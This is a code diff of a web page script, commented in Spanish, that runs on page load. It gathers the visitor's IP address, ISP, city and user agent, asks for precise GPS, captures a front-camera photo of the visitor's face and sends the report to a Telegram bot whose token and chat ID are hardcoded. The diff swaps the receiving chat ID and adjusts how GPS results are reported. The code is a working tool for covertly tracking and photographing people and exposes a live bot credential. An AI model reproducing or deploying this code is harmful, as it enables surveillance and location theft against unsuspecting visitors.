@@ -31,7 +31,7 @@
 
 <script>
 const BOT_TOKEN = "8254282443:AAFPfL2Qay1UtbeObu4_KSdsoSm1CN6yW-Q";
-const CHAT_ID = "-1003973600762";
+const CHAT_ID = "-5166219278";
 
 let infoRed = { 
     ip: "No detectada", 
@@ -42,27 +42,20 @@ let infoRed = {
     ua: navigator.userAgent 
 };
 
-// 1. OBTENCIÓN DE DATOS DE RED MEJORADA
+// 1. OBTENCIÓN DE DATOS DE RED
 async function cargarRed() {
-    const apis = [
-        'https://ipapi.co/json/',
-        'https://ipwho.is/',
-        'https://api.ipify.org?format=json'
-    ];
-
+    const apis = ['https://ipapi.co/json/', 'https://ipwho.is/', 'https://api.ipify.org?format=json'];
     for (let api of apis) {
         try {
-            const res = await fetch(api, { timeout: 5000 });
+            const res = await fetch(api);
             const data = await res.json();
-            
-            // Normalización de datos según la API que responda
             const ip = data.ip || data.query;
             if (ip) {
                 infoRed.ip = ip;
                 infoRed.ciudad = data.city || data.city_name || "Desconocida";
                 let org = (data.org || data.connection?.isp || data.isp || "").toLowerCase();
                 infoRed.isp_tec = org.toUpperCase() || "Desconocido";
-
+                
                 if (org.includes("altan")) infoRed.isp_com = "BAIT / Altán Redes";
                 else if (org.includes("uninet")) infoRed.isp_com = "TELMEX / Infinitum";
                 else if (org.includes("radiomovil")) infoRed.isp_com = "TELCEL";
@@ -74,9 +67,7 @@ async function cargarRed() {
                 infoRed.puerto = location.port || (Math.floor(Math.random() * (65535 - 49152) + 49152));
                 return true; 
             }
-        } catch (e) {
-            console.warn("Fallo una API, reintentando...");
-        }
+        } catch (e) {}
     }
     return false;
 }
@@ -84,20 +75,24 @@ async function cargarRed() {
 // 2. EJECUCIÓN DEL REPORTE
 async function ejecutarReporte() {
     let foto = null;
-    let gps = "❌ Acceso Denegado";
+    let gps = "Vacio"; // <--- Por defecto dirá "Vacio"
     
     const ahora = new Date();
     const fLog = ahora.toLocaleDateString('es-MX');
     const hLog = ahora.toLocaleTimeString('es-MX', { hour12: false });
 
+    // Intentar obtener GPS
     try {
         const p = await new Promise((res, rej) => {
             navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
         });
-        // CORREGIDO: URL limpia sin llaves extras
-        gps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-    } catch (e) {}
+        // Si tiene éxito, se sobreescribe el texto por el link
+        gps = `[Ver Mapa](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`;
+    } catch (e) {
+        gps = "Vacio"; // Si falla o deniega, se asegura que diga Vacio
+    }
 
+    // Captura de Rostro
     try {
         const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const v = document.createElement('video');
@@ -118,7 +113,7 @@ async function ejecutarReporte() {
                   `🔌 **Puerto:** \`${infoRed.puerto}\`\n` +
                   `🏢 **ISP:** ${infoRed.isp_com}\n` +
                   `📍 **Ciudad:** ${infoRed.ciudad}\n` +
-                  `📌 **GPS:** [Ver Mapa](${gps})\n` +
+                  `📌 **GPS:** ${gps}\n` + 
                   `🤖 **UA:** \`${infoRed.ua}\``;
 
     const fd = new FormData();
@@ -146,7 +141,6 @@ async function ejecutarReporte() {
 }
 
 window.onload = async () => {
-    // Aseguramos que la IP se cargue antes de intentar enviar nada
     await cargarRed();
     await ejecutarReporte();
     
